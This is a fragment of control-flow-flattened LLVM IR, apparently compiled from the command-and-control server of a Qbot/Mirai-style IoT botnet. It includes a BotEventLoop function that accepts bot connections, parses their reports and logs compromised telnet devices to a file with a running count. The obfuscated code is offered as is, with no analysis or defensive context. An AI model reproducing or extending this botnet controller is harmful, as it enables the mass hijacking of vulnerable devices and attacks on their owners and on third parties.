  %86 = load i32, i32* %12, align 4
  %87 = call i64 @send(i32 %86, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i64 2, i32 16384)
  store i32 -1892893, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %12, align 4
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i32 0, i32 0), i32 %89)
  %91 = load i32, i32* %12, align 4
  %92 = load i8*, i8** %4, align 8
  %93 = load i8*, i8** %4, align 8
  %94 = call i64 @strlen(i8* %93) #8
  %95 = call i64 @send(i32 %91, i8* %92, i64 %94, i32 16384)
  %96 = load i32, i32* %7, align 4
  %97 = icmp ne i32 %96, 0
  %98 = select i1 %97, i32 1411563844, i32 360179436
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %12, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %101
  %103 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 4
  %105 = icmp ne i32 %104, 0
  %106 = select i1 %105, i32 -2110901892, i32 360179436
  store i32 %106, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = load i32, i32* %12, align 4
  %109 = call i64 @send(i32 %108, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i32 0, i32 0), i64 13, i32 16384)
  store i32 -1351042048, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %12, align 4
  %112 = call i64 @send(i32 %111, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0), i64 1, i32 16384)
  store i32 -1351042048, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 -1068488871, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %12, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %12, align 4
  store i32 664457886, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %8, align 8
  call void @free(i8* %118) #7
  ret void

loopEnd:                                          ; preds = %114, %113, %110, %107, %99, %88, %78, %70, %66, %65, %57, %53, %45, %40, %36, %18, %17, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @BotEventLoop(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.epoll_event, align 1
  %5 = alloca %struct.epoll_event*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr, align 2
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.clientdata_t*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i64, align 8
  %18 = alloca [2048 x i8], align 16
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %22 = call noalias i8* @calloc(i64 1000000, i64 12) #7
  %23 = bitcast i8* %22 to %struct.epoll_event*
  store %struct.epoll_event* %23, %struct.epoll_event** %5, align 8
  %switchVar = alloca i32
  store i32 -1821069774, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1821069774, label %24
    i32 665995033, label %28
    i32 -1234304118, label %33
    i32 875922019, label %43
    i32 -1347043896, label %53
    i32 -740073838, label %63
    i32 484996753, label %82
    i32 -1401860738, label %93
    i32 -1629847072, label %94
    i32 1233157297, label %100
    i32 594840613, label %105
    i32 1252718641, label %110
    i32 84029893, label %111
    i32 227241340, label %112
    i32 1768604309, label %121
    i32 281481435, label %125
    i32 -969302530, label %133
    i32 1070109215, label %138
    i32 -1220978221, label %139
    i32 -172097536, label %152
    i32 -913854522, label %153
    i32 -231411607, label %154
    i32 1692162450, label %157
    i32 -207717190, label %161
    i32 -215517092, label %166
    i32 -344547712, label %169
    i32 1885802641, label %172
    i32 -692688242, label %178
    i32 1140298397, label %181
    i32 -1889137420, label %192
    i32 -846456399, label %195
    i32 1503751441, label %202
    i32 1193903754, label %203
    i32 -1717531342, label %216
    i32 58705744, label %218
    i32 -1710223803, label %222
    i32 -925689476, label %228
    i32 -1085078528, label %230
    i32 -358994242, label %235
    i32 1721022395, label %236
    i32 1326953890, label %242
    i32 -511450984, label %247
    i32 853191638, label %248
    i32 1155734053, label %249
    i32 1995428000, label %255
    i32 -805167522, label %266
    i32 520956096, label %272
    i32 898711425, label %275
    i32 1986318790, label %281
    i32 -1431044730, label %284
    i32 -2109412007, label %289
    i32 -59570400, label %290
    i32 -1866956664, label %293
    i32 -717646390, label %297
    i32 257910950, label %302
    i32 -285158195, label %303
    i32 848034809, label %304
    i32 1420233787, label %308
    i32 -165030367, label %309
    i32 1708761220, label %310
    i32 117691299, label %314
    i32 -1393108527, label %319
    i32 1209663482, label %320
    i32 974237255, label %321
    i32 -1791689049, label %322
    i32 1341436058, label %323
    i32 254382144, label %326
    i32 259899477, label %327
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load volatile i32, i32* @epollFD, align 4
  %26 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %27 = call i32 @epoll_wait(i32 %25, %struct.epoll_event* %26, i32 1000000, i32 -1)
  store i32 %27, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 665995033, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i32, i32* %8, align 4
  %30 = load i32, i32* %7, align 4
  %31 = icmp slt i32 %29, %30
  %32 = select i1 %31, i32 -1234304118, i32 254382144
  store i32 %32, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %35 = load i32, i32* %8, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %34, i64 %36
  %38 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %37, i32 0, i32 0
  %39 = load i32, i32* %38, align 1
  %40 = and i32 %39, 8
  %41 = icmp ne i32 %40, 0
  %42 = select i1 %41, i32 -740073838, i32 875922019
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %45 = load i32, i32* %8, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %44, i64 %46
  %48 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %47, i32 0, i32 0
  %49 = load i32, i32* %48, align 1
  %50 = and i32 %49, 16
  %51 = icmp ne i32 %50, 0
  %52 = select i1 %51, i32 -740073838, i32 -1347043896
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %55 = load i32, i32* %8, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %54, i64 %56
  %58 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %57, i32 0, i32 0
  %59 = load i32, i32* %58, align 1
  %60 = and i32 %59, 1
  %61 = icmp ne i32 %60, 0
  %62 = select i1 %61, i32 484996753, i32 -740073838
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %65 = load i32, i32* %8, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %64, i64 %66
  %68 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %67, i32 0, i32 1
  %69 = bitcast %union.epoll_data* %68 to i32*
  %70 = load i32, i32* %69, align 1
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %71
  %73 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %72, i32 0, i32 1
  store i8 0, i8* %73, align 4
  %74 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %75 = load i32, i32* %8, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %74, i64 %76
  %78 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %77, i32 0, i32 1
  %79 = bitcast %union.epoll_data* %78 to i32*
  %80 = load i32, i32* %79, align 1
  %81 = call i32 @close(i32 %80)
  store i32 1341436058, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load volatile i32, i32* @listenFD, align 4
  %84 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %85 = load i32, i32* %8, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %84, i64 %86
  %88 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %87, i32 0, i32 1
  %89 = bitcast %union.epoll_data* %88 to i32*
  %90 = load i32, i32* %89, align 1
  %91 = icmp eq i32 %83, %90
  %92 = select i1 %91, i32 -1401860738, i32 1193903754
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 -1629847072, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 16, i32* %10, align 4
  %95 = load volatile i32, i32* @listenFD, align 4
  %96 = call i32 @accept(i32 %95, %struct.sockaddr* %9, i32* %10)
  store i32 %96, i32* %11, align 4
  %97 = load i32, i32* %11, align 4
  %98 = icmp eq i32 %97, -1
  %99 = select i1 %98, i32 1233157297, i32 227241340
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = call i32* @__errno_location() #9
  %102 = load i32, i32* %101, align 4
  %103 = icmp eq i32 %102, 11
  %104 = select i1 %103, i32 1252718641, i32 594840613
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = call i32* @__errno_location() #9
  %107 = load i32, i32* %106, align 4
  %108 = icmp eq i32 %107, 11
  %109 = select i1 %108, i32 1252718641, i32 84029893
  store i32 %109, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  store i32 1503751441, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0))
  store i32 1503751441, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = bitcast %struct.sockaddr* %9 to %struct.sockaddr_in*
  %114 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %113, i32 0, i32 2
  %115 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %114, i32 0, i32 0
  %116 = load i32, i32* %115, align 2
  %117 = load i32, i32* %11, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %118
  %120 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %119, i32 0, i32 0
  store i32 %116, i32* %120, align 8
  store i32 0, i32* %13, align 4
  store i32 0, i32* %12, align 4
  store i32 1768604309, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* %12, align 4
  %123 = icmp slt i32 %122, 1000000
  %124 = select i1 %123, i32 281481435, i32 1692162450
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i32, i32* %12, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %127
  %129 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %128, i32 0, i32 1
  %130 = load i8, i8* %129, align 4
  %131 = icmp ne i8 %130, 0
  %132 = select i1 %131, i32 -969302530, i32 1070109215
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i32, i32* %12, align 4
  %135 = load i32, i32* %11, align 4
  %136 = icmp eq i32 %134, %135
  %137 = select i1 %136, i32 1070109215, i32 -1220978221
  store i32 %137, i32* %switchVar
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  store i32 -231411607, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %12, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %141
  %143 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %142, i32 0, i32 0
  %144 = load i32, i32* %143, align 8
  %145 = load i32, i32* %11, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %146
  %148 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %147, i32 0, i32 0
  %149 = load i32, i32* %148, align 8
  %150 = icmp eq i32 %144, %149
  %151 = select i1 %150, i32 -172097536, i32 -913854522
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 1, i32* %13, align 4
  store i32 1692162450, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  store i32 -231411607, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i32, i32* %12, align 4
  %156 = add nsw i32 %155, 1
  store i32 %156, i32* %12, align 4
  store i32 1768604309, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i32, i32* %13, align 4
  %159 = icmp ne i32 %158, 0
  %160 = select i1 %159, i32 -207717190, i32 1885802641
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = load i32, i32* %11, align 4
  %163 = call i64 @send(i32 %162, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i32 0, i32 0), i64 13, i32 16384)
  %164 = icmp eq i64 %163, -1
  %165 = select i1 %164, i32 -215517092, i32 -344547712
  store i32 %165, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load i32, i32* %11, align 4
  %168 = call i32 @close(i32 %167)
  store i32 -1629847072, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i32, i32* %11, align 4
  %171 = call i32 @close(i32 %170)
  store i32 -1629847072, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32, i32* %11, align 4
  %174 = call i32 @make_socket_non_blocking(i32 %173)
  store i32 %174, i32* %6, align 4
  %175 = load i32, i32* %6, align 4
  %176 = icmp eq i32 %175, -1
  %177 = select i1 %176, i32 -692688242, i32 1140298397
  store i32 %177, i32* %switchVar
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load i32, i32* %11, align 4
  %180 = call i32 @close(i32 %179)
  store i32 1503751441, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i32, i32* %11, align 4
  %183 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 1
  %184 = bitcast %union.epoll_data* %183 to i32*
  store i32 %182, i32* %184, align 1
  %185 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 0
  store i32 -2147483647, i32* %185, align 1
  %186 = load volatile i32, i32* @epollFD, align 4
  %187 = load i32, i32* %11, align 4
  %188 = call i32 @epoll_ctl(i32 %186, i32 1, i32 %187, %struct.epoll_event* %4) #7
  store i32 %188, i32* %6, align 4
  %189 = load i32, i32* %6, align 4
  %190 = icmp eq i32 %189, -1
  %191 = select i1 %190, i32 -1889137420, i32 -846456399
  store i32 %191, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  %193 = load i32, i32* %11, align 4
  %194 = call i32 @close(i32 %193)
  store i32 1503751441, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i32, i32* %11, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %197
  %199 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %198, i32 0, i32 1
  store i8 1, i8* %199, align 4
  %200 = load i32, i32* %11, align 4
  %201 = call i64 @send(i32 %200, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i32 0, i32 0), i64 14, i32 16384)
  store i32 -1629847072, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  store i32 1341436058, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %205 = load i32, i32* %8, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %204, i64 %206
  %208 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %207, i32 0, i32 1
  %209 = bitcast %union.epoll_data* %208 to i32*
  %210 = load i32, i32* %209, align 1
  store i32 %210, i32* %14, align 4
  %211 = load i32, i32* %14, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %212
  store %struct.clientdata_t* %213, %struct.clientdata_t** %15, align 8
  store i32 0, i32* %16, align 4
  %214 = load %struct.clientdata_t*, %struct.clientdata_t** %15, align 8
  %215 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %214, i32 0, i32 1
  store i8 1, i8* %215, align 4
  store i32 -1717531342, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %217, i8 0, i64 2048, i32 16, i1 false)
  store i32 58705744, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %219, i8 0, i64 2048, i32 16, i1 false)
  %220 = icmp ne i8* %219, null
  %221 = select i1 %220, i32 -1710223803, i32 -925689476
  store i32 %221, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  %223 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %224 = load i32, i32* %14, align 4
  %225 = call i32 @fdgets(i8* %223, i32 2048, i32 %224)
  %226 = sext i32 %225 to i64
  store i64 %226, i64* %17, align 8
  %227 = icmp sgt i64 %226, 0
  store i32 -925689476, i32* %switchVar
  store i1 %227, i1* %.reg2mem
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %229 = select i1 %.reload, i32 -1085078528, i32 -1866956664
  store i32 %229, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  %231 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %232 = call i8* @strstr(i8* %231, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #8
  %233 = icmp eq i8* %232, null
  %234 = select i1 %233, i32 -358994242, i32 1721022395
  store i32 %234, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  store i32 1, i32* %16, align 4
  store i32 -1866956664, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @trim(i8* %237)
  %238 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %239 = call i32 @strcmp(i8* %238, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %240 = icmp eq i32 %239, 0
  %241 = select i1 %240, i32 1326953890, i32 1155734053
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i32, i32* %14, align 4
  %244 = call i64 @send(i32 %243, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i64 5, i32 16384)
  %245 = icmp eq i64 %244, -1
  %246 = select i1 %245, i32 -511450984, i32 853191638
  store i32 %246, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  store i32 1, i32* %16, align 4
  store i32 -1866956664, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  store i32 58705744, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %251 = call i8* @strstr(i8* %250, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0)) #8
  %252 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %253 = icmp eq i8* %251, %252
  %254 = select i1 %253, i32 1995428000, i32 -805167522
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %257 = call i8* @strstr(i8* %256, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0)) #8
  %258 = getelementptr inbounds i8, i8* %257, i64 7
  store i8* %258, i8** %19, align 8
  %259 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %260 = load i8*, i8** %19, align 8
  %261 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %259, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i32 0, i32 0), i8* %260)
  %262 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %263 = call i32 @fflush(%struct._IO_FILE* %262)
  %264 = load volatile i32, i32* @TELFound, align 4
  %265 = add nsw i32 %264, 1
  store volatile i32 %265, i32* @TELFound, align 4
  store i32 58705744, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  %267 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %268 = call i8* @strstr(i8* %267, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i32 0, i32 0)) #8
  %269 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %270 = icmp eq i8* %268, %269
  %271 = select i1 %270, i32 520956096, i32 898711425
  store i32 %271, i32* %switchVar
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %273 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %274 = call i8* @strstr(i8* %273, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i32 0, i32 0)) #8
  store i8* %274, i8** %20, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  store i32 58705744, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %277 = call i8* @strstr(i8* %276, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0)) #8
  %278 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %279 = icmp eq i8* %277, %278
  %280 = select i1 %279, i32 1986318790, i32 -1431044730
  store i32 %280, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %283 = call i8* @strstr(i8* %282, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0)) #8
  store i8* %283, i8** %21, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  store i32 58705744, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %286 = call i32 @strcmp(i8* %285, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i32 0, i32 0)) #8
  %287 = icmp eq i32 %286, 0
  %288 = select i1 %287, i32 -2109412007, i32 -59570400
  store i32 %288, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  store i32 58705744, i32* %switchVar
  br label %loopEnd

; <label>:290:                                    ; preds = %loopEntry
  %291 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %292 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i32 0, i32 0), i8* %291)
  store i32 58705744, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i64, i64* %17, align 8
  %295 = icmp eq i64 %294, -1
  %296 = select i1 %295, i32 -717646390, i32 848034809
  store i32 %296, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = call i32* @__errno_location() #9
  %299 = load i32, i32* %298, align 4
  %300 = icmp ne i32 %299, 11
  %301 = select i1 %300, i32 257910950, i32 -285158195
  store i32 %301, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  store i32 1, i32* %16, align 4
  store i32 -285158195, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  store i32 1209663482, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  %305 = load i64, i64* %17, align 8
  %306 = icmp eq i64 %305, 0
  %307 = select i1 %306, i32 1420233787, i32 -165030367
  store i32 %307, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  store i32 1, i32* %16, align 4
  store i32 1209663482, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  store i32 1708761220, i32* %switchVar
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  %311 = load i32, i32* %16, align 4
  %312 = icmp ne i32 %311, 0
  %313 = select i1 %312, i32 117691299, i32 -1393108527
  store i32 %313, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load %struct.clientdata_t*, %struct.clientdata_t** %15, align 8
  %316 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %315, i32 0, i32 1
  store i8 0, i8* %316, align 4
  %317 = load i32, i32* %14, align 4
  %318 = call i32 @close(i32 %317)
  store i32 -1393108527, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  store i32 -1717531342, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  store i32 974237255, i32* %switchVar
  br label %loopEnd

; <label>:321:                                    ; preds = %loopEntry
  store i32 -1791689049, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  store i32 1341436058, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  %324 = load i32, i32* %8, align 4
  %325 = add nsw i32 %324, 1
  store i32 %325, i32* %8, align 4
  store i32 665995033, i32* %switchVar
  br label %loopEnd

; <label>:326:                                    ; preds = %loopEntry
  store i32 -1821069774, i32* %switchVar
  br label %loopEnd

; <label>:327:                                    ; preds = %loopEntry
  %328 = load i8*, i8** %2, align 8
  ret i8* %328

loopEnd:                                          ; preds = %326, %323, %322, %321, %320, %319, %314, %310, %309, %308, %304, %303, %302, %297, %293, %290, %289, %284, %281, %275, %272, %266, %255, %249, %248, %247, %242, %236, %235, %230, %228, %222, %218, %216, %203, %202, %195, %192, %181, %178, %172, %169, %166, %161, %157, %154, %153, %152, %139, %138, %133, %125, %121, %112, %111, %110, %105, %100, %94, %93, %82, %63, %53, %43, %33, %28, %24, %switchDefault
  br label %loopEntry
}

